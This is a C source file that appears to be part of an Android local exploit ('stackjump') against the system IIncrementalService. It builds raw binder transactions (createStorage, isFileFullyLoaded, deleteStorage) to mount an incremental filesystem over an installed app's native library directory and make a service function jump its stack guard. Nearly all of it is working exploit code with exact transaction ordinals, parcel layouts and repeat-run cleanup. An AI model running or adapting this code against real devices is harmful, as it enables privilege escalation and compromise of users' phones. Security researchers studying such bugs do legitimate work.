// IIncrementalService calls. createStorage-mounting an incrementalfs instance
// makes the mount cache stale, so a later isFileFullyLoaded() runs
// MountRegistry::Mounts::loadFrom() — the 128 KiB-frame function that jumps the
// stack guard once the recursion has driven the SP near the bottom.
// AIDL ordinals (code = 1 + ordinal): openStorage 0, createStorage 1,
// isFileFullyLoaded 13, deleteStorage 18.
#include "stackjump.h"

// The incremental-mount target: some unused directory under /data/app. Any
// installed package's legacyNativeLibraryDir works; Chrome is only a
// reliably-present default. Override with $DP_MOUNT_PKG to avoid touching
// Chrome (e.g. use domainprobe's own package once integrated).
void get_target_path(char *path, size_t cap) {
  const char *pkg = getenv("DP_MOUNT_PKG");
  if (!pkg || !*pkg) pkg = "com.android.chrome";
  char cmd[256];
  snprintf(cmd, sizeof(cmd),
           "pm dump-package %s | grep legacyNativeLibraryDir=/data/app/ | cut -d= -f2- | tr -d '\n'",
           pkg);
  FILE *path_cmd_out = popen(cmd, "r");
  if (!path_cmd_out) errx(1, "popen(pm dump-package %s)", pkg);
  size_t n = fread(path, 1, cap - 64, path_cmd_out);
  path[n] = '\0';
  pclose(path_cmd_out);
  if (n == 0) errx(1, "could not resolve legacyNativeLibraryDir for %s (installed?)", pkg);
  // The subdir to mount over. Default "arm64" matches Chrome, whose lib/ is
  // unused. For a package that extracts its libs (useLegacyPackaging), point
  // at an unused subdir instead so the mount shadows nothing -- override with
  // $DP_MOUNT_SUBDIR.
  const char *sub = getenv("DP_MOUNT_SUBDIR");
  if (!sub || !*sub) sub = "arm64";
  strcat(path, "/");
  strcat(path, sub);
}

// openStorage(path) -> storageId, or <0 if no storage exists for that path.
int incremental_open(const char *path) {
  AParcel *in = NULL, *out = NULL;
  SCHK(AIBinder_prepareTransaction(incremental_service, &in));
  SCHK(AParcel_writeString(in, path, strlen(path)));
  binder_status_t st = AIBinder_transact(incremental_service, /*openStorage*/(1+0), &in, &out, 0);
  if (st) return -1;
  AStatus *status;
  SCHK(AParcel_readStatusHeader(out, &status));
  int32_t id = -1;
  AParcel_readInt32(out, &id);
  AParcel_delete(out);
  return id;
}

// deleteStorage(storageId) -> void. This is the missing cleanup: temporary
// storage is NOT reclaimed on our process exit, so without it a second
// createStorage over the same path returns -1 forever (until reboot). Deleting
// ours makes the run repeatable.
void incremental_delete(int storageId) {
  if (storageId < 0) return;
  AParcel *in = NULL, *out = NULL;
  if (AIBinder_prepareTransaction(incremental_service, &in)) return;
  AParcel_writeInt32(in, storageId);
  binder_status_t st = AIBinder_transact(incremental_service, /*deleteStorage*/(1+18), &in, &out, 0);
  if (!st && out) AParcel_delete(out);
}

// Clear any storage left over from a previous run at our target path, so
// createStorage starts from a clean slate every time.
void cleanup_stale_storage(const char *path) {
  int stale = incremental_open(path);
  if (stale >= 0) {
    printf("cleaning stale storageId %d at <%s>\n", stale, path);
    incremental_delete(stale);
  }
}

int incremental_create_mount(void) {
  char path[1000];
  get_target_path(path, sizeof(path));
  printf("will incremental-mount over <%s>\n", path);
  cleanup_stale_storage(path);

  AParcel *in = NULL, *out = NULL;
  SCHK(AIBinder_prepareTransaction(incremental_service, &in));
  // string path
  // params
  //   int32 1 (kNonNullParcelableFlag)
  //   ---
  //   int32 length
  //   int32 type
  //   string packagename
  //   string classname
  //   string arguments
  // int32 mode
  SCHK(AParcel_writeString(in, path, strlen(path)));
  SCHK(AParcel_writeInt32(in, 1)); // kNonNullParcelableFlag
  int dpos1 = AParcel_getDataPosition(in);
  SCHK(AParcel_writeInt32(in, 0)); // length = <placeholder>
  SCHK(AParcel_writeInt32(in, 2)); // type = incremental
  SCHK(AParcel_writeString(in, "org.connectbot", strlen("org.connectbot")));
  SCHK(AParcel_writeString(in, "FooClass", strlen("FooClass")));
  SCHK(AParcel_writeString(in, "args", strlen("args")));
  int dpos2 = AParcel_getDataPosition(in);
  SCHK(AParcel_setDataPosition(in, dpos1));
  SCHK(AParcel_writeInt32(in, dpos2 - dpos1));
  SCHK(AParcel_setDataPosition(in, dpos2));
  SCHK(AParcel_writeInt32(in, 4 | 1)); // create temporary
  printf("sending createStorage to %p\n", incremental_service);
  SCHK(AIBinder_transact(incremental_service, /*TRANSACTION_createStorage*/(1+1), &in, &out, 0));
  printf("done with createStorage\n");
  AStatus *status;
  SCHK(AParcel_readStatusHeader(out, &status));
  printf("status: %s\n", AStatus_getDescription(status));
  int32_t retval;
  SCHK(AParcel_readInt32(out, &retval));
  printf("return value: %d\n", retval);
  if (retval == -1)
    errx(1, "createStorage failed");
  AParcel_delete(out);
  return retval;
}

// isFileFullyLoaded(storageId, "/"). Returns the binder-transport status: 0 is
// a normal reply (retval printed), non-zero is a transport-level failure, which
// is the anomaly the exploit is trying to induce. No scanning/exit here -- the
// caller decides, because hog() also calls this as a warm-up with an invalid id
// (which returns a normal reply with retval=-22, NOT a transport error).
binder_status_t incremental_iffl(int storageId) {
  AParcel *in = NULL, *out = NULL;
  SCHK(AIBinder_prepareTransaction(incremental_service, &in));
  SCHK(AParcel_writeInt32(in, storageId));
  const char *path = "/";
  SCHK(AParcel_writeString(in, path, strlen(path)));
  binder_status_t st = AIBinder_transact(incremental_service, /*TRANSACTION_isFileFullyLoaded*/(1+13), &in, &out, 0);
  if (st) {
    AStatus *status1 = AStatus_fromStatus(st);
    printf("TRANSACTION_isFileFullyLoaded transport error: %s\n", AStatus_getDescription(status1));
    return st;
  }
  AStatus *status;
  SCHK(AParcel_readStatusHeader(out, &status));
  printf("status: %s\n", AStatus_getDescription(status));
  int32_t retval;
  SCHK(AParcel_readInt32(out, &retval));
  printf("return value: %d\n", retval);
  AParcel_delete(out);
  return 0;
}
